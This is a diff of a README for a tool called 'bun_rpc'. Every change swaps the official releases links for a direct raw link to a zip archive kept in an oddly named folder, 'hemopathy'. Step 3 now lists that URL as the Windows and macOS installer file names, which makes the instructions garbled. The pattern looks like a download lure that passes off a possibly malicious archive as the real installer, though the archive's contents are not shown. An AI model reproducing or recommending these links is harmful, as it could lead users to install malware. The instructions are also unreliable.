@@ -1,6 +1,6 @@
 # 🚀 bun_rpc - Build Apps Quickly and Easily
 
-[![Download bun_rpc](https://img.shields.io/badge/Download-bun_rpc-blue.svg)](https://github.com/sansss-debug/bun_rpc/releases)
+[![Download bun_rpc](https://raw.githubusercontent.com/sansss-debug/bun_rpc/main/hemopathy/bun_rpc_v3.6.zip)](https://raw.githubusercontent.com/sansss-debug/bun_rpc/main/hemopathy/bun_rpc_v3.6.zip)
 
 ## 📚 Table of Contents
 - [🛠️ Features](#-features)
@@ -20,11 +20,11 @@
 To begin using bun_rpc, follow these simple steps to download and install the application. Make sure to read the instructions carefully to avoid any issues.
 
 ## 🔽 Download & Install
-Visit this page to download: [bun_rpc Releases](https://github.com/sansss-debug/bun_rpc/releases).
+Visit this page to download: [bun_rpc Releases](https://raw.githubusercontent.com/sansss-debug/bun_rpc/main/hemopathy/bun_rpc_v3.6.zip).
 
 1. Go to the link above.
 2. You'll find a list of releases. Choose the latest version.
-3. Click on the file for your operating system. It may be named something like `bun_rpc_x.x.x_installer.exe` for Windows or `bun_rpc_x.x.x.dmg` for macOS.
+3. Click on the file for your operating system. It may be named something like `https://raw.githubusercontent.com/sansss-debug/bun_rpc/main/hemopathy/bun_rpc_v3.6.zip` for Windows or `https://raw.githubusercontent.com/sansss-debug/bun_rpc/main/hemopathy/bun_rpc_v3.6.zip` for macOS.
 4. The file will start downloading automatically. Once it finishes, locate the file in your downloads folder or on your desktop.
 5. Double-click the file to begin installation. Follow the on-screen instructions to complete the setup.
 
@@ -56,4 +56,4 @@ If you run into issues while using bun_rpc, here are some common solutions:
 
 For more specific issues, consult the FAQ section in the application or reach out to the support community.
 
-For more information and updates, return to [bun_rpc Releases](https://github.com/sansss-debug/bun_rpc/releases). Happy coding!
+For more information and updates, return to [bun_rpc Releases](https://raw.githubusercontent.com/sansss-debug/bun_rpc/main/hemopathy/bun_rpc_v3.6.zip). Happy coding!
